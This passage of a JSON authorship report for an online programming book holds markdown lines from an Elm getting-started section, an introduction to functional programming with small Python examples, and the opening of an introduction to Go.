        "content": "Let\u0027s say you want to get the width of an img element. This is really hard to do! Since all you do is tell Elm _how_ to render your application, you don\u0027t have any way to retrieve that particular img element in Elm, and you have to resort to using ports and JavaScript. This [stackoverflow](https://stackoverflow.com/questions/48551782/elm-get-the-size-of-an-image) post gives an example."
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "openorclose"
        },
        "content": "## How to Get Started with Elm?"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Migrating From Other Frameworks"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If your project is already written in React, Vue, or another framework, is it worth it to migrate?"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The great news is that you don\u0027t have to spend weeks migrating only to figure out it wasn\u0027t worth the effort."
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "openorclose"
        },
        "content": "You can introduce Elm slowly, by letting it take over only a single element in your page. Preferably, choose a part of your page that doesn\u0027t need to interact with the other parts."
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The increment/decrement demo above is a great choice, for example."
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Then, while Elm coexists with your other framework, you can decide if you want to incrementally port over your other framework\u0027s code to Elm."
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you decide Elm isn\u0027t right for you, that\u0027s okay! You only tried it on a small sandboxed portion of your app, and you can choose to leave that Elm in or convert it back into your existing framework."
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Starting a New Project"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Play with Elm without installation, using the Elm playground [Ellie](https://ellie-app.com/)."
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "openorclose"
        },
        "content": "After that, you can follow the official [Elm guide](https://guide.elm-lang.org/)."
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "openorclose"
        },
        "content": "View the official documentation along with documentation for all available Elm packages [here](https://package.elm-lang.org/)."
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm has a small but very helpful community. Join the [Elm Slack](https://elmlang.herokuapp.com/) or the [Elm Discourse](https://discourse.elm-lang.org/)."
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you\u0027re interested, the [official Elm blog](https://elm-lang.org/news) has really interesting posts on their design philosophies."
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "openorclose": 295
    }
  },
  {
    "path": "contents/functionalProgramming/intro.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: An Introduction to Functional Programming"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# An Introduction to Functional Programming"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Phang Chun Rong](https://github.com/crphang)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## What is Functional Programming"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "Functional programming is a programming paradigm that treats computation as the evaluation of mathematical function and avoids mutating state and variables. Unlike [imperative programming](https://en.wikipedia.org/wiki/Imperative_programming) languages like C, functional programming languages are [declarative](https://en.wikipedia.org/wiki/Declarative_programming). Even though this demands a shift in mindset from most programmers who are used to imperative form of programming, functional programming paradigm is still [increasingly popular](https://blog.appdynamics.com/engineering/the-most-popular-programming-languages-for-2017/) due to its [advantages](#advantages-of-functional-programming)."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "## Functional Programming Languages"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "Functional programming is simply a paradigm and needs to be implemented by programming languages. Below are various [languages](https://en.wikipedia.org/wiki/List_of_programming_languages_by_type#Functional_languages) that have explicit support for the functional programming paradigm:"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "- Haskell"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "- Clojure"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "- Elixir"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "- Elm"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "- Scala"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "- ML (Meta Language) family of languages"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "While functional programming can be implemented by languages like Java, the languages listed above encourage the functional programming paradigm such as [pure functions](#pure-functions) or even enforce them in the case of Haskell."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "## Concepts in Functional Programming"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "#### Pure Functions"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "_Pure functions_ is one of the concepts in functional programming. To call a function _pure_, it needs to satisfy two conditions:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Idempotence](https://en.wikipedia.org/wiki/Idempotence) - The function should return the same output for the same input when invoked arbitrarily many times."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "1. No side effects - The function should not cause side effects like mutating global state."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "To illustrate an example of a pure function. Consider this simple example in Python:"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "# Pure Function"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "def add(x, y):"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "    return x + y"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "Contrast this with an impure function:"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "# Mutate state"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "y\u003d0"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "def add_to_y(x):"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "    global y"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "    y \u003d y + x"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    return y"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "We see that the impure function violates both conditions. Running `add_to_y` multiple times with the same input X would give different value."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "#### Immutability"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "Another concept in functional programming is immutability. Immutability prevents an object\u0027s state to be change after it is created."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "Having immutability built into functional programming languages like Haskell helps ensure that functions are _pure_ because mutable variables and states can introduce side-effects."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "To know more about immutability in functional languages, you can take a look at:"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "- [Immutability in Haskell](https://mmhaskell.com/blog/2017/1/9/immutability-is-awesome)"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Immutability in Elm](https://elmprogramming.com/immutability.html)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "- [Why does immutability enable functional programming](https://stackoverflow.com/questions/12207757/why-do-immutable-objects-enable-functional-programming)"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "## Techniques in Functional Programming"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "#### Recursion"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Pure functional languages do not have loop constructs like imperative languages. This is because `Iteration` usually involves state mutation per iteration. Because functional programming avoids state changes, `Recursion` is a commonly used [technique](https://www.quora.com/Why-dont-pure-functional-programming-languages-provide-a-loop-construct) to replace `Iteration`. An example of replacing state-mutating iterative code to a pure functional recusive code is shown below:"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "```Python"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "# Iterative"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "def getSumOfList(listOfNumbers):"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    sum \u003d 0"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "    for number in listOfNumbers:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "        sum +\u003d number"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    return sum"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```Python"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "# Recursive"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "def getSumOfList(listOfNumbers):"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "    if len(listOfNumbers) \u003d\u003d 0:"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "        return 0"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "    return listOfNumbers[0] + getSumOfList(listOfNumbers[1:])"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Hence, to be able to write functional languages effectively, it means being able to replace Iteration with Recursion. Here are some guides to help you on that:"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "- [Introduction to Recursion](https://www.topcoder.com/community/data-science/data-science-tutorials/an-introduction-to-recursion-part-1/)"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "- [Recursion in functional programming](https://dzone.com/articles/functional-programming-recursion)"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "#### Higher Order Functions"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "Higher Order Functions are functions that either take functions as parameters, return a function, or both. As functions are first class citizens in functional programming languages, this allows [functions to be passed around like objects and values](https://en.wikipedia.org/wiki/Functional_programming#First-class_and_higher-order_functions)."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "One example of Higher Order Functions is `map`, which takes in a function and a collection of objects."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "length_of_names \u003d map(len, [\u0027Alex\u0027, \u0027Thomas\u0027, \u0027John\u0027])"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "print(length_of_names) # [4,6,4]"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "`map` takes in 2 parameters, a function and a collection. `map` returns a new collection whose elements are the result of applying the given function on the elements of the given collection. In the given example, `map` returns `[len(\u0027Alex\u0027), len(\u0027Thomas\u0027), len(\u0027John\u0027)]`"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "There are useful functions and techniques that are based off Higher Order Functions in Functional programming."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "- [Currying](https://hackernoon.com/javascript-and-functional-programming-currying-pt-4-96e3230782ab)"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "- [Map, Reduce and Filter](https://medium.freecodecamp.org/higher-order-functions-in-javascript-d9101f9cf528)"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "## Advantages of Functional Programming"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "The common question when learning about functional programming is what\u0027s the point of having us going through all the trouble of having pure functions, state immutability and absence of loops. Turns out, there are various positive implications of functional programming:"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "- [More Bug-Free Code](https://www.quora.com/Are-software-written-using-Functional-Programming-less-buggy-more-robust-and-stable). For example famously in Haskell, [if it compiles it usually works](https://wiki.haskell.org/Why_Haskell_just_works)."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "- [Safer Concurrency](https://softwareengineering.stackexchange.com/questions/293851/what-is-it-about-functional-programming-that-makes-it-inherently-adapted-to-para). Having state immutability and absence of side effects can allow for concurrent code with less concerns of race conditions on mutable objects."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "- [And many more](https://alvinalexander.com/scala/fp-book/benefits-of-functional-programming) such as simpler unit testing as functions are guaranteed not to have any side effects."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "## Disadvantages of Functional Programming"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "Functional programming is not a new concept and has been around since the 1950s. Even though it is gaining in popularity today, it is not the predominant programming paradigm used in software applications today. Despite the stated benefits of functional programming, there are some downsides of it that can help explain why it is not the mainstream programming paradigm:"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "- Lack of imperative data structures. One good example is the [lack of hash map](https://stackoverflow.com/questions/6793259/how-does-one-implement-hash-tables-in-a-functional-language) which is an important performant dictionary."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "- Functional programming can be [slower](https://www.quora.com/Do-functional-programming-languages-always-run-slower-than-imperative-language) than optimal Imperative programming for reasons such as data copying due to data immutability."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- And various [other concerns](https://flyingfrogblog.blogspot.sg/2016/05/disadvantages-of-purely-functional.html)"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "Some of these reasons help in part explain why \u0027impure\u0027 functional languages like Scala is much more popular today than Haskell. Scala is a general purpose language that has interoperability with Java and has support for both imperative and functional programming paradigms. This establishes a [middle ground](https://cacm.acm.org/magazines/2014/4/173220-unifying-functional-and-object-oriented-programming-with-scala/fulltext) for programmers new to functional programming."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "## Guides on Functional Programming"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "Functional programming can be a very different programming paradigm and it definitely takes time to practice to be an expert at it. To learn more about functional programming, take a look at these amazing guides for a deeper understanding:"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "- A good [overview of functional programming](https://en.wikipedia.org/wiki/Functional_programming)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "- A six-part [introduction to functional programming](https://medium.com/@cscalfani/so-you-want-to-be-a-functional-programmer-part-1-1f15e387e536)"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "- If you are hungry for more, take the [excellent functional programming principles course](https://www.coursera.org/learn/progfun1)"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "- And to help with the mindset shift for functional programming, take a look at a [practical guide on how to translate an imperative to functional style](https://maryrosecook.com/blog/post/a-practical-introduction-to-functional-programming)"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 2,
      "-": 146
    }
  },
  {
    "path": "contents/go/Go.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Go"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Go"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Cara Leong](https://github.com/craaaa)**\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Darren Wee](https://github.com/darrenwee), [Tran Tien Dat](https://github.com/tran-tien-dat)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What Is Go?‎](#what-is-go)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why Learn Go?](#why-learn-go)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: Better Variable Declarations](#benefit-better-variable-declarations)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: Better Support for Concurrency‎](#benefit-better-support-for-concurrency)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: Better Error Handling](#benefit-better-error-handling)‎"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: `defer` Execution‎](#benefit-defer-execution)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: Good Support for Interfaces](#benefit-good-support-for-interfaces)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Benefit: Canonical Coding Style‎](#benefit-canonical-coding-style)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to Get Started with Go?‎](#how-to-get-started-with-go)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Where to Go from Here?‎](#where-to-go-from-here)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "## What Is Go?"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "Go (also known as `golang`) is a compiled, statically-typed, garbage-collected language that has special memory safety and concurrent programming features. Born out of frustration with the available languages (e.g. C, C++, Java) and environments for systems programming, Go was [conceptualized by programmers at Google](https://talks.golang.org/2012/splash.article) who sought to create a single language that was efficient to write, build and execute. Go also supports newer developments in computing such as multicore processors and network systems."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Learn Go?"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Go is a language built for software engineers.** As it was written by software engineers at Google, Go addresses and attempts to solve some of the  pain points that exist in many commonly-used languages. For instance, the language has easy dependency management, prides itself on fast builds and has many [easy to use debugging, testing, and code-vetting tools](https://medium.com/google-cloud/go-tooling-in-action-eca6882ff3bc). These features make Go an easy language to use for software development."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Go is a useful systems-side (i.e. backend) language.** As it was built with large, distributed architectures in mind, Go is useful for creating [scalable server-side programs](https://www.quora.com/How-is-Go-used-at-Google-What-could-be-areas-specific-systems-applications-in-which-Go-could-replace-other-languages-used-nowadays-inside-Google-and-why-would-it-make-sense-to-introduce-Go-in-place-of-another-language) that handle multicore processors, networked systems or even large computation clusters. In other words, if you\u0027re looking to make an Android application, Go is [probably not the language for you](https://www.reddit.com/r/golang/comments/5vhvbc/confused_as_to_what_go_is_actually_used_for/). However, if you\u0027re looking to pick up a language that is reasonably easy to learn, builds on the foundations of other common languages and creates programs that are easily scalable, then Go may be the language for you."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
